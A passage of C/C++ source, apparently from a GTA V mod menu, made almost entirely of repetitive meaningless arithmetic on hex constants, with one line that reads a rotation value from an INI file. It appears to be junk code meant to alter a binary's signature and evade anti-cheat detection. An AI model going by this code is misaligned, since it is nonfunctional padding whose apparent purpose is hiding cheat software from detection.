				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				Spawn.RotX = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotX");

				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
